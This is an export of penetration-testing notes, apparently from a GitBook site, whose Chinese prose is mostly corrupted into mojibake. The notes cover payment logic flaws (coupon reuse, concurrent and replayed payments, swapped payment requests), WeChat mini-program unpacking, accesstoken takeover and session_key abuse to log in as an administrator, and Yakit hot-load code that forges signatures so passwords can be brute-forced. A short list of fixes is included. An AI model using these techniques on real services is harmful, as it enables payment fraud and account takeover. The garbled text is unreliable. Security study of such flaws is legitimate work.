è®¢å•å…³é—­è¿”è¿˜ä¼˜æƒ åˆ¸ï¼šä½¿ç”¨ä¼˜æƒ å·åˆ›å»ºä¸€ä¸ªå¾…æ”¯ä»˜è®¢å•ï¼Œç„¶åå…³é—­è¿™ä¸ªå¾…æ”¯ä»˜è®¢å•ï¼Œè¿™æ—¶å€™è®¢å•å…³é—­ä¼šè¿”è¿˜ä¼˜æƒ å·ï¼Œå¦‚æœè¿™ä¸ªå…³é—­çš„è®¢å•å¯ä»¥é‡æ–°å˜ä¸ºå¾…æ”¯ä»˜è®¢å•ï¼ˆå°±æ˜¯ä¹‹å‰ä½¿ç”¨ä¼˜æƒ åˆ¸çš„é‡‘é¢ï¼‰é‚£ä¹ˆå°±å­˜åœ¨è¿™ä¸ªæ¼æ´ æ¯æ—¥ç­¾åˆ°åœºæ™¯ ä¿®æ”¹å½“å‰è®¾å¤‡æ—¶é—´ å¹¶å‘ç­¾åˆ° ä¿®æ”¹æ•°æ®åŒ…æ—¶é—´å‚æ•° ç­¾çº¦ä½ä»·åœºæ™¯ åœºæ™¯ï¼šå°±æ˜¯ç”¨æˆ·ç¬¬ä¸€ä¸ªæœˆä¼šå‘˜ä¾¿å®œï¼Œä½†æ˜¯ä¼šåœ¨ç­¾çº¦å¯¹è±¡é‚£é‡Œå¼€é€šè‡ªåŠ¨ç»­è´¹åŠŸèƒ½ å¤šæ¬¡ç­¾çº¦ä½ä»· æ¼æ´å±å®³ï¼šåŸæœ¬åªèƒ½ä½ä»·å¼€é€šä¸€ä¸ªæœˆï¼Œä½†æ˜¯é€šè¿‡è¿™ä¸ªæ¼æ´èƒ½å¤Ÿä½ä»·å¼€é€šä¸æ­¢ä¸€ä¸ªæœˆ æ¼æ´åŸç†ï¼šç­¾çº¦çš„å¯¹è±¡æœ‰å¤šä¸ªï¼Œæ¯”å¦‚å¾®ä¿¡å’Œæ”¯ä»˜å®ï¼Œè®©è¿™ä¸¤ä¸ªéƒ½åœç•™åœ¨ç­¾çº¦ç•Œé¢ï¼Œç„¶åå…ˆå®Œæˆå…¶ä¸­ä¸€ä¸ªç­¾çº¦å†å–æ¶ˆç­¾çº¦ï¼Œå†åˆ°å¦ä¸€ä¸ªå®Œæˆç­¾çº¦ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªç­¾çº¦è¢«å–æ¶ˆæ‰äº†æ‰€ä»¥æœåŠ¡ç«¯è®¤ä¸ºå¦ä¸€ä¸ªç­¾çº¦è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç­¾çº¦ï¼Œä»è€Œä½ä»·å¼€é€šäº†ä¸¤ä¸ªæœˆ è®¢å•åˆ¤æ–­ å¹¶å‘æ”¯ä»˜ è´­ä¹°æˆåŠŸä¹‹åï¼Œç»§ç»­é‡æ”¾è¯·æ±‚ï¼Œå¯ä»¥è®©è´­ä¹°çš„å•†å“ä¸€ç›´å¢åŠ ã€‚è´­ä¹°æˆåŠŸä¹‹åï¼Œä¼šæœ‰ä¸€ä¸ªé“¶è¡Œå¯¹å•†æˆ·ç½‘ç«™è·³è½¬çš„è¿‡ç¨‹ï¼Œå¦‚æœåå¤è¿›è¡Œæ“ä½œï¼Œæœ‰å‡ ç‡ä¼šå¯¼è‡´å•†å“åå¤è´­ä¹°å’Œå¢åŠ ï¼Œä½†æ˜¯ä¸éœ€è¦ä»˜æ›´å¤šçš„é’±ã€‚ æ›¿æ¢æ”¯ä»˜ åŒæ—¶å‘æœåŠ¡å™¨å‘èµ·äºŒæ¬¡æ”¯ä»˜è¯·æ±‚ä¸€ä¸ªå¤šä¸€ä¸ªå°‘ï¼Œæ”¯ä»˜é‡‘é¢å°‘çš„ï¼Œç„¶åæ”¯ä»˜ä¹‹åè¿›è¡Œæ›¿æ¢ï¼Œå‘ŠçŸ¥æœåŠ¡å™¨è®¢å•æ”¯ä»˜å®Œæˆï¼Œå¹¶ä¸”è¿‡ç¨‹å¯ä»¥åå¤çš„å›æ”¾ã€‚ è®¢å•å•†å“ä¿®æ”¹ æŠŠå•†å“æ”¾å…¥è´­ç‰©è½¦ç‚¹å‡»ä¸‹å•æ”¯ä»˜ï¼Œä¼šè·³è½¬åˆ°å¾®ä¿¡ï¼Œæ”¯ä»˜å®ç­‰ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°ã€‚è¿™ä¸ªæ—¶å€™è¿˜å¯ä»¥ç»§ç»­åœ¨è´­ç‰©è½¦ä¸­åŠ å…¥å•†å“ï¼Œæ”¯ä»˜ç»“æŸä¹‹åï¼Œå•†å®¶å‘æ”¾çš„å•†å“æ˜¯ç°åœ¨çš„è´­ç‰©è½¦é‡Œé¢çš„ä¸œè¥¿ã€‚ æ”¯ä»˜æ¥å£ æ”¯ä»˜æ¥å£ä¿®æ”¹ æ”¯ä»˜æ¥å£å¯†é’¥Key æš´åŠ›ç ´è§£ ç§˜é’¥æ³„æ¼ 8.æ¬ºè¯ˆ:éœ€è¦ä¸¤ä¸ªæ”¶æ¬¾äººï¼Œä¸€ä¸ªæ˜¯æ­£å¸¸çš„å•†å®¶ï¼Œä¸€ä¸ªæ˜¯ä¼ªé€ çš„å•†å®¶ 9.å•ä½æ›¿æ¢ï¼šäº§ç”Ÿåœ¨paypalç±»ä¼¼çš„å›½é™…æ”¯ä»˜çš„åœºæ™¯ã€‚ æ”¯ä»˜å®‰å…¨ä¿®å¤ 1ã€åœ¨åç«¯æ£€æŸ¥è®¢å•çš„æ¯ä¸€ä¸ªå€¼ï¼ŒåŒ…æ‹¬æ”¯ä»˜çŠ¶æ€ï¼› 2ã€æ ¡éªŒä»·æ ¼ã€æ•°é‡å‚æ•°ï¼Œæ¯”å¦‚äº§å“æ•°é‡åªèƒ½ä¸ºæ•´æ•°ï¼Œå¹¶é™åˆ¶æœ€å¤§è´­ä¹°æ•°é‡ ï¼› 3ã€ä¸ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°æ£€æŸ¥ï¼Œå®é™…æ”¯ä»˜çš„é‡‘é¢æ˜¯å¦ä¸è®¢å•é‡‘é¢ä¸€è‡´ï¼› 4ã€å¦‚ç»™ç”¨æˆ·é€€æ¬¾ï¼Œè¦ä½¿ç”¨åŸè·¯ã€åŸè®¢å•é€€å›ã€‚å¦‚ï¼šé€€æŠ¼é‡‘ï¼ŒæŒ‰ç”¨æˆ·åŸæ”¯ä»˜è®¢å•åŸè·¯é€€å›ï¼› 5ã€åŠ å¯†ã€è§£å¯†ã€æ•°å­—ç­¾ååŠéªŒè¯ï¼Œè¿™ä¸ªå¯ä»¥æœ‰æ•ˆé¿å…æ•°æ®ä¿®æ”¹ï¼Œé‡æ”¾æ”»å‡»ä¸­çš„å„ç§é—®é¢˜ï¼› 6ã€é‡‘é¢è¶…è¿‡æŒ‡å®šå€¼ï¼Œè¿›è¡Œäººå·¥å®¡æ ¸ç­‰ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 22:18:58 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/11.é€»è¾‘æ¼æ´/04.å…¶ä»–.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/11.é€»è¾‘æ¼æ´/04.å…¶ä»–.html","title":"04.å…¶ä»–","keywords":"","body":"å¹¶å‘--æ¡ä»¶ç«äº‰ ä¸‡ç‰©çš†å¯å¹¶å‘ ä¿®å¤æ–¹æ¡ˆ æ•°æ®åº“çš„äº‹åŠ¡é” æ—¶é—´æ ¡éªŒæ¼æ´ é€šè¿‡æ›´æ”¹ç³»ç»Ÿæ—¶é—´æ¥è¿›è¡Œç»•è¿‡ æ¤ç‰©å¤§æˆ˜åƒµå°¸æµ‡æ°´ æå‰è¿›å…¥æ´»åŠ¨é¡µé¢å¯è¾“å…¥å­—ç¬¦ï¼Œæ¯”å¦‚æŸå¥¶èŒ¶å…å•è¾“å…¥å£ä»¤ â€‹ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 22:19:49 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/12.å¾®ä¿¡å°ç¨‹åº/å°ç¨‹åºä¸å…¬ä¼—å·.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/12.å¾®ä¿¡å°ç¨‹åº/å°ç¨‹åºä¸å…¬ä¼—å·.html","title":"å°ç¨‹åºä¸å…¬ä¼—å·","keywords":"","body":"å¾®ä¿¡å°ç¨‹åºå’Œå…¬ä¼—å· è¿™ä¸¤æœ‰çš„ä¼šæ ¡éªŒæ•°æ®åŒ…ä¸­çš„User-Agentï¼Œæ‰€ä»¥ç”¨ä¸€äº›æ‰«æå·¥å…·çš„æ—¶å€™è¦å¸¦ä¸Šå¯¹åº”çš„User-Agentæ‰è¡Œ æˆ–è€…è¦å¸¦ä¸ŠUAå’Œcookie # å…¬ä¼—å·UA Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090621) XWEB/8287 Flue # å°ç¨‹åºUA Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/8287 å°ç¨‹åºæ¥å£â†’Webåå° å¼€å‘è€…ä¸ºäº†æ–¹ä¾¿ç®¡ç†å’Œè°ƒè¯•ï¼Œä¼šåœ¨å…¬ç½‘ Api åç«¯æœåŠ¡å™¨ä¸Šæ­å»ºä¸€ä¸ªåå°ç®¡ç†ç•Œé¢ä»è€Œæ–¹ä¾¿ç®¡ç†æ•°æ® æŠŠå°ç¨‹åºæŠ“åŒ…æ—¶çš„urlå¤åˆ¶åˆ°æµè§ˆå™¨ä¸­ï¼Œå¯»æ‰¾åå°ï¼ˆè›®å¤šçš„ğŸ¤—ï¼‰ åå°åç§° å¸¸è§„çš„ å°ç¨‹åºåå­—ç¼©å†™+webç­‰ æ¯”å¦‚ å°±è¿™ä¸ªåå°å‡ºäº†ä¸‰ä¸ªé«˜å±ï¼Œå¼±å£ä»¤ï¼Œä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå­˜å‚¨å‹xss å°ç¨‹åºæœ¬èº« å¾®ä¿¡å°ç¨‹åºå®‰å…¨æµ…æ æŠ“åŒ… PCï¼šproxifier+burp Androidï¼šåŒä¸€ä¸ªå±€åŸŸç½‘ä¸‹ï¼Œwifiä»£ç†+burp è§£åŒ…è¿˜åŸ ä¸€é”®è§£å¯†+åç¼–è¯‘å·¥å…· https://pan.baidu.com/s/1N3ZR3djSaS8g_RXc0Hsa5Q?login_type=qzone&pwd=f79y&_at_=1693833286263 æ³¨æ„ç‚¹ï¼šè¿›å…¥å°ç¨‹åºåï¼Œå…ˆæŠŠå„ç§åŠŸèƒ½ç‚¹ç‚¹ï¼ŒåŠ è½½æ›´å¤šçš„ç¨‹åºä¹‹åå†è¿›è¡Œåç¼–è¯‘ å°ç¨‹åºæ‰“å¼€æ—¶ æ‰“å¼€ç‚¹ç‚¹ç‚¹ä¹‹åï¼Œç‚¹äº†ä¸€éƒ¨åˆ†åå°±å¤šäº†3MB PC éœ€è¦å…ˆè§£å¯†ï¼Œå†åç¼–è¯‘ï¼Œå°ç¨‹åºæ–‡ä»¶ä½ç½®å¦‚ä¸‹ Android ç›´æ¥åç¼–è¯‘å³å¯ /data/data/com.tencent.mm/MicroMsg/df69765be7b6e4a441a86a25d26e861f/appbrand/pkg/_-1486048203_3.wxapkg æ•æ„Ÿä¿¡æ¯æ³„éœ² # ä¼šåœ¨KillWxapkg.exeåŒç›®å½•ä¸‹ç”Ÿæˆsensitive_data.jsonæ–‡ä»¶ KillWxapkg.exe -id=wxid -in=\".wxapkgæ‰€åœ¨ç›®å½•\" -sensitive é…ç½®æ–‡ä»¶åœ¨KillWxapkg.exeåŒç›®å½•ä¸‹çš„configç›®å½• å°ç¨‹åºhookå¼€å¯F12 KillWxapkg.exe -hook # WeChatOpenDevTools python main.py -all å°ç¨‹åºæ–‡ä»¶åœ¨nodomainä¸‹ accesstokenæ³„éœ²-å°ç¨‹åºæ¥ç®¡ æ³„æ¼äº†AppIDå’ŒAppSecretï¼Œå¯ä»¥é€šè¿‡æ¥å£è·å–accesstokenæ¥æ¥ç®¡å°ç¨‹åº è¿˜æœ‰ä¸€ç§æ˜¯æ¶ˆè€—æ¯å¤©çš„accesstokençš„è·å–æ¬¡æ•° sessionkeyæ³„æ¼ è§£å¯† åˆ©ç”¨ åˆ©ç”¨è¿™ä¸ªæ¼æ´çš„å±å®³ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªå¾®ä¿¡å°ç¨‹åºçš„ç«™ç‚¹æ‰¾åˆ°é‡Œé¢ç®¡ç†å‘˜çš„æ‰‹æœºå·ï¼Œç„¶åå»æ›¿æ¢æ‰‹æœºå·ï¼Œç„¶åå†åå‘åŠ å¯†ï¼Œç„¶åå†æ›¿æ¢å›å¼€å§‹ç™»å½•çš„æ•°æ®åŒ…ä¸­ï¼Œç„¶åå†ä¸€é”®æ”¾åŒ…ï¼Œå°±å¯ä»¥æˆåŠŸç™»å½•æˆ‘ä»¬ç®¡ç†å‘˜çš„åå°äº† å¾®ä¿¡å¼€å‘è€…å·¥å…·è°ƒè¯• æŠ¥é”™ä¿®å¤ wxmlæ–‡ä»¶ï¼ˆæ ·å¼æ–‡ä»¶ï¼‰æŠ¥é”™ä¿®å¤ï¼šç›´æ¥åˆ é™¤ æ’ä»¶ä¿®å¤ï¼šé‡åˆ°ä¸éœ€è¦ä½¿ç”¨çš„æ’ä»¶ç›´æ¥åˆ é™¤ï¼Œè¦ç”¨åˆ°çš„æ’ä»¶å»å®˜æ–¹åå°æ·»åŠ  å…¬ä¼—å· è·Ÿwebæ€è·¯ä¸€æ ·ï¼Œæ³¨æ„UAå¤´å³å¯ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 15:48:40 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/13.å‰ç«¯åŠ å¯†å¯¹æŠ—/å‰ç«¯åŠ å¯†æ¸—é€.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/13.å‰ç«¯åŠ å¯†å¯¹æŠ—/å‰ç«¯åŠ å¯†æ¸—é€.html","title":"å‰ç«¯åŠ å¯†æ¸—é€","keywords":"","body":" Yakitï¼šçƒ­åŠ è½½ burpï¼šæ’ä»¶burpcryptoï¼Œautodecoder å‰ç½®ç›¸å…³çŸ¥è¯† jså‘èµ·httpè¯·æ±‚ åœ¨JavaScriptä¸­ï¼Œå‘èµ·HTTPè¯·æ±‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼Œé€‚ç”¨äºä¸åŒçš„ç¯å¢ƒå’Œéœ€æ±‚ï¼š 1. XMLHttpRequest XMLHttpRequest æ˜¯ä¸€ä¸ªåœ¨è¾ƒæ—©ç‰ˆæœ¬çš„JavaScriptä¸­ç”¨äºå‘èµ·HTTPï¼ˆæˆ–HTTPSï¼‰è¯·æ±‚çš„å¯¹è±¡ã€‚å®ƒå¹¿æ³›ç”¨äºAJAXç¼–ç¨‹ä¸­ä»¥å¼‚æ­¥æ–¹å¼ä»æœåŠ¡å™¨è·å–æ•°æ®ï¼Œä¸åˆ·æ–°é¡µé¢ã€‚ â€Œç¤ºä¾‹ä»£ç â€Œï¼š var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"https://api.example.com/data\", true); xhr.onreadystatechange = function () { if (xhr.readyState === 4 && xhr.status === 200) { console.log(xhr.responseText); } }; xhr.send(); 2. Fetch API Fetch API æ˜¯ä¸€ä¸ªç°ä»£çš„æ¥å£ï¼Œç”¨äºåœ¨ç½‘ç»œä¸Šè¿›è¡ŒHTTPè¯·æ±‚ã€‚å®ƒæä¾›äº†ä¸€ä¸ªæ›´ç®€å•å’Œçµæ´»çš„æ–¹å¼æ¥å‘èµ·è¯·æ±‚å’Œå¤„ç†å“åº”ï¼Œæ¯”XMLHttpRequestæ›´ç›´è§‚ã€‚ â€Œç¤ºä¾‹ä»£ç â€Œï¼š fetch('https://api.example.com/data') .then(response => response.json()) .then(data => console.log(data)) .catch(error => console.error('Error:', error)); 3. jQuery.ajax() å¦‚æœä½ åœ¨é¡¹ç›®ä¸­ä½¿ç”¨äº†jQueryåº“ï¼Œå¯ä»¥ä½¿ç”¨$.ajax()æ–¹æ³•è½»æ¾å‘èµ·HTTPè¯·æ±‚ã€‚è¿™ä¸ªæ–¹æ³•æä¾›äº†ä¸€ä¸ªçµæ´»çš„æ¥å£ï¼Œèƒ½å¤Ÿå¤„ç†å¤šç§æ•°æ®ç±»å‹ï¼Œå¹¶ä¸”æ”¯æŒå›è°ƒå‡½æ•°ç®¡ç†è¯·æ±‚çš„æˆåŠŸå’Œå¤±è´¥ã€‚ â€Œç¤ºä¾‹ä»£ç â€Œï¼š $.ajax({ url: \"https://api.example.com/data\", method: \"GET\", success: function(data) { console.log(data); }, error: function(xhr, status, error) { console.error(\"Error: \" + error); } }); 4. Axios Axios æ˜¯ä¸€ä¸ªåŸºäºPromiseçš„HTTPå®¢æˆ·ç«¯ï¼Œé€‚ç”¨äºæµè§ˆå™¨å’Œnode.jsã€‚å®ƒæä¾›äº†ä¸€ç§æ›´ç°ä»£çš„æ–¹å¼æ¥å‘èµ·HTTPè¯·æ±‚ï¼Œæ¯”åŸç”Ÿçš„XMLHttpRequestå’ŒFetch APIéƒ½è¦æ˜“ç”¨ã€‚ â€Œå®‰è£…â€Œï¼ˆåœ¨Node.jsç¯å¢ƒä¸‹æˆ–é€šè¿‡npm/yarnåœ¨å‰ç«¯é¡¹ç›®ä¸­ï¼‰ï¼š npm install axios â€Œç¤ºä¾‹ä»£ç â€Œï¼š javascriptCopy Codeimport axios from 'axios'; axios.get('https://api.example.com/data') .then(response => { console.log(response.data); }) .catch(error => { console.error('Error:', error); }); å¯†ç å­¦ å¯¹ç§°åŠ å¯† å¯¹ç§°åŠ å¯†æ˜¯ä¸€ç§åŠ å¯†æ–¹æ³•ï¼Œå…¶ä¸­å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä½¿ç”¨ç›¸åŒçš„å¯†é’¥æ¥åŠ å¯†å’Œè§£å¯†æ•°æ®ï¼Œå› æ­¤å¯¹ç§°åŠ å¯†çš„å®‰å…¨æ€§å–å†³äºå¯¹ç§°å¯†é’¥çš„ä¿å¯†æ€§ã€‚ è¿™ç§åŠ å¯†æ–¹å¼å› å…¶æ•ˆç‡é«˜ã€é€Ÿåº¦å¿«è€Œè¢«å¹¿æ³›åº”ç”¨äºéœ€è¦å¤§é‡æ•°æ®åŠ å¯†çš„åœºæ™¯ä¸­ï¼Œå¸¸è§çš„å¯¹ç§°åŠ å¯†ç®—æ³•å¦‚ä¸‹ï¼š AES DESä¸3DES SM4 DESç®—æ³•ä¸å¤Ÿå®‰å…¨ï¼ˆå¯è¢«æš´åŠ›ç ´è§£ï¼‰ï¼Œç°ä»£å¤§éƒ½é‡‡ç”¨AESç®—æ³•è¿›è¡ŒåŠ å¯†ï¼ŒSM4ä¸ºå›½å¯†ç®—æ³•ã€‚ éå¯¹ç§°åŠ å¯†--å…¬é’¥ç®—æ³• éå¯¹ç§°åŠ å¯†ä½¿ç”¨ä¸€å¯¹å¯†é’¥ï¼šä¸€ä¸ªå…¬é’¥å’Œä¸€ä¸ªç§é’¥ã€‚å…¬é’¥å¯ä»¥è‡ªç”±åˆ†å‘ï¼Œç”¨äºåŠ å¯†ä¿¡æ¯ï¼›ç§é’¥åˆ™å¿…é¡»ä¿å¯†ï¼Œç”¨äºè§£å¯†ä¿¡æ¯ã€‚ RSA SM2 ESC DSA DHå¯†é’¥äº¤æ¢ éå¯¹ç§°åŠ å¯†ç®—æ³•è™½ç„¶æä¾›äº†æ›´é«˜çš„å®‰å…¨æ€§ï¼Œä½†ç”±äºå…¶è®¡ç®—å¤æ‚åº¦è¾ƒé«˜ï¼Œå¤„ç†é€Ÿåº¦é€šå¸¸æ…¢äºå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ å› æ­¤ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œç»å¸¸å°†éå¯¹ç§°åŠ å¯†ä¸å¯¹ç§°åŠ å¯†ç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚åœ¨å»ºç«‹å®‰å…¨è¿æ¥æ—¶ä½¿ç”¨éå¯¹ç§°åŠ å¯†äº¤æ¢å¯¹ç§°å¯†é’¥ï¼Œç„¶åä½¿ç”¨å¯¹ç§°åŠ å¯†è¿›è¡Œåç»­çš„æ•°æ®ä¼ è¾“ï¼Œä»¥è¾¾åˆ°å®‰å…¨ä¸æ•ˆç‡çš„å¹³è¡¡ã€‚ åŠ å¯†æ¨¡å¼ åŠ å¯†æ¨¡å¼ CBC ECB IVï¼ˆåˆå§‹å—ï¼‰ éœ€è¦ ä¸éœ€è¦ KEY çš„é•¿åº¦ 16/24/32 å­—èŠ‚ 16/24/32 å­—èŠ‚ åŠ å¯†åç‰¹å¾ IVä¸åŒï¼Œå¯†æ–‡ä¹Ÿä¸ç›¸åŒ æ˜æ–‡æ˜¯é™æ€çš„ - ä¸¤ä¸ªæ˜æ–‡ç›¸åŒï¼Œé‚£ä¹ˆä»–ä»¬å¯†æ–‡ä¹Ÿç›¸åŒ å‰ç«¯åŠ å¯†åº“ å‰ç«¯åŠ å¯†ä¸€èˆ¬å¸¸ç”¨çš„æ˜¯ä¸¤ä¸ªåº“ï¼ŒCryptoJS å’Œ jsrsasignï¼Œä»–ä»¬å½¼æ­¤ä¾§é‡ç‚¹å…¶å®æ˜¯ä¸ä¸€æ ·çš„ï¼š CryptoJS CryptoJS ä¸»è¦æä¾› AESï¼ŒSHAï¼ŒHMACï¼ŒPBKDF2 ç­‰åŠ å¯†ç®—æ³• AESï¼šé»˜è®¤é…ç½®CBCæ¨¡å¼ï¼ŒPKCS#7å¡«å…… // å¼•å…¥ CryptoJS åº“ const CryptoJS = require('crypto-js'); // ç¤ºä¾‹æ˜æ–‡ const word = \"Hello, World!\"; // å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡ const key = CryptoJS.enc.Utf8.parse('1234567890123456'); // 16å­—èŠ‚å¯†é’¥ const iv = CryptoJS.enc.Utf8.parse('1234567890123456'); // 16å­—èŠ‚IV // åŠ å¯† const encrypted = CryptoJS.AES.encrypt(word, key, { iv: iv }).toString(); console.log(\"Encrypted Data:\", encrypted); // è§£å¯† const decrypted = CryptoJS.AES.decrypt(encrypted, key, { iv: iv }).toString(CryptoJS.enc.Utf8); console.log(\"Decrypted Data:\", decrypted); jsencrypt jsencrypt æ˜¯ä¸€ä¸ªç”¨ JavaScript ç¼–å†™çš„åº“ï¼Œç”¨äºåœ¨æµè§ˆå™¨ç«¯å®ç° RSA åŠ å¯†å’Œè§£å¯†ã€‚åŠ è§£å¯†æ—¶é»˜è®¤å¡«å……æ¨¡å¼ï¼šPKCS#1 v1.5 ç”Ÿæˆå¯†é’¥å¯¹ var encrypt = new JSEncrypt(); encrypt.getKey(); // ç”Ÿæˆå¯†é’¥å¯¹ var pub_key = encrypt.getPublicKey(); // è·å–å…¬é’¥ var pri_key = encrypt.getPrivateKey(); // è·å–ç§é’¥ console.log(\"Public Key:\", pub_key); console.log(\"Private Key:\", pri_key); åŠ å¯† var encrypt = new JSEncrypt(); encrypt.setPublicKey(pubkey); var text = \"Hello, World!\"; var encrypted = encrypt.encrypt(text); console.log(encrypted); // åŠ å¯†åçš„æ–‡æœ¬ è§£å¯† var decrypt = new JSEncrypt(); decrypt.setPrivateKey(pri_key); var decrypted = decrypt.decrypt(encrypted); console.log(\"Decrypted Text:\", decrypted); // è§£å¯†åçš„æ–‡æœ¬ toStringç¼–ç  CryptoJS çš„ key åœ¨æ²¡æœ‰æ˜ç¡®æŒ‡å®šç¼–ç æ–¹å¼çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤çš„ toString æ–¹æ³•å°†è¾“å‡ºåå…­è¿›åˆ¶ (Hex) æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚ var key = CryptoJS.enc.Utf8.parse('1234567890123456'); key.toString(); // è¾“å‡º \"31323334353637383930313233343536\" //å…¶ä»–ç¼–ç  key.toString(CryptoJS.enc.Base64); // è¾“å‡º \"MTIzNDU2Nzg5MDEyMzQ1Ng==\" key.toString(CryptoJS.enc.Utf8); // è¾“å‡º \"1234567890123456\" åŠ å¯†å‡½æ•°çš„toString()é€šå¸¸éƒ½æ˜¯ä½¿ç”¨base64æ–¹æ³•å¯¹å¾—åˆ°çš„å­—èŠ‚å¯†æ–‡è¿›è¡Œç¼–ç  â€‹ åŸºç¡€æ¡ˆä¾‹ yakitè‡ªå¸¦é¶åœº https://github.com/SwagXz/encrypt-labs é˜²ç¯¡æ”¹ //å¯†é’¥è·å– function generateKey() { return CryptoJS.enc.Utf8.parse(\"1234123412341234\") // åå…­ä½åå…­è¿›åˆ¶æ•°ä½œä¸ºå¯†é’¥ } const key = generateKey() // åŠ å¯†æ–¹æ³• function Encrypt(word) { console.info(word); return CryptoJS.HmacSHA256(word, key.toString(CryptoJS.enc.Utf8)).toString(); } function outputObj(jsonData) { const word = `username=${jsonData.username}&password=${jsonData.password}`;; return { \"signature\": Encrypt(word), \"key\": key.toString(), username: jsonData.username, password: jsonData.password, } } åŸç† å‰ç«¯ï¼šæŠŠæ•°æ®æŒ‰ç…§ä¸€å®šæ ¼å¼ä½¿ç”¨å“ˆå¸Œç®—æ³•è¿›è¡Œç§˜é’¥å“ˆå¸Œè¿ç®—ç”Ÿæˆå“ˆå¸Œå€¼ï¼Œå‘é€æ•°æ®åŒ…æºå¸¦è¿™ä¸ªå“ˆå¸Œå€¼å’Œkey åç«¯ï¼šæ­¤æ—¶åç«¯æ‹¿åˆ°æ•°æ®æœ‰ï¼ˆä»¥ä¸Šè¾¹é¶åœºä¸ºä¾‹ï¼‰ï¼šsignatureã€keyã€usernameã€passwordã€‚æŠŠusernameå’ŒpasswordæŒ‰ç…§ä¸€å®šæ ¼å¼åœ¨è¿›è¡Œç§˜é’¥å“ˆå¸Œè¿ç®—ç”Ÿæˆçš„å€¼ä¸signatureå¯¹æ¯”ï¼Œè‹¥ä¸€æ ·éªŒè¯é€šè¿‡ï¼ è§£å†³ çƒ­åŠ è½½ä»£ç  sign = func(password) { key = `1234123412341234` data=f`username=admin&password=${password}` signature = codec.EncodeToHex(codec.HmacSha256(key, data)) return signature } ä½¿ç”¨çƒ­åŠ è½½ å…ˆ HMAC-SHA256 å† RSA //å…¬é’¥è·å– setTimeout(function(){ fetch('/crypto/js/rsa/public/key').then(async function(rsp) { pubkey = await rsp.text() document.getElementById('submit').disabled = false; document.getElementById('submit').innerText = 'æäº¤è¡¨å•æ•°æ®'; console.info(pubkey) }) },300) function generateKey() { return CryptoJS.enc.Utf8.parse(\"1234123412341234\") // åå…­ä½åå…­è¿›åˆ¶æ•°ä½œä¸ºå¯†é’¥ } const key = generateKey() // åŠ å¯†æ–¹æ³• function Encrypt(word) { console.info(word); return KEYUTIL.getKey(pubkey).encrypt(CryptoJS.HmacSHA256(word, key.toString(CryptoJS.enc.Utf8)).toString()); } function outputObj(jsonData) { const word = `username=${jsonData.username}&password=${jsonData.password}`;; return { \"signature\": Encrypt(word), \"key\": key.toString(), username: jsonData.username, password: jsonData.password, } } sign = func(password) { key = `1234123412341234` data=f`username=admin&password=${password}` pem = `-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvbwzeHs99hoATSTO6ZQg HHYr9U0ZV3l5KDhgwcFAe2nhBfyX4Po2OT8bb0te68y2pyl3/zrYxn5WJY2WXgNa cZycgYCBkESkXUWrAV6zsUQFmIX8CMqv6lCElZDiO5aNEB4c4cM0P+tECtPHgbQK t1QQD1iD9Dlw800eIPE8tPoeHLcdyQJYrLZgHgAPN4J6vwhtThyyqjUJWFNp/V2J bgo3GsxKZaU2emrFWXqcGVQP78mVUih4YlWHGFPyEnOLqg0noAb0vttsUILJvLrn v2pOcnxj1zgK8CghMrehJ9XycGaKI9JIisD4noE70videPMYIZxzyA7YB+k4nEMs 8QIDAQAB -----END PUBLIC KEY-----` //KEYUTIL.getKey(pubkey).encrypt(CryptoJS.HmacSHA256(word, key.toString(CryptoJS.enc.Utf8)).toString()); signature = codec.EncodeToHex(codec.HmacSha256(key, data)) signature = codec.EncodeToHex(codec.RSAEncryptWithPKCS1v15(pem,signature)~) return signature } è¯·æ±‚åŠ å¯† AES CBCæ¨¡å¼ï¼ˆKEY/IVå‰ç«¯ç”Ÿæˆï¼‰ //ç”ŸæˆIV var iv = CryptoJS.lib.WordArray.random(128/8); //ç”Ÿæˆkey function generateKey() { return CryptoJS.enc.Utf8.parse(\"1234123412341234\") // åå…­ä½åå…­è¿›åˆ¶æ•°ä½œä¸ºå¯†é’¥ } // åŠ å¯†æ–¹æ³• function Encrypt(word) { console.info(word); return CryptoJS.AES.encrypt(word, key, {iv: iv}).toString(); } function outputObj(jsonData) { const word = JSON.stringify(jsonData); return { \"data\": Encrypt(word), \"key\": key.toString(), iv: iv.toString(), } } 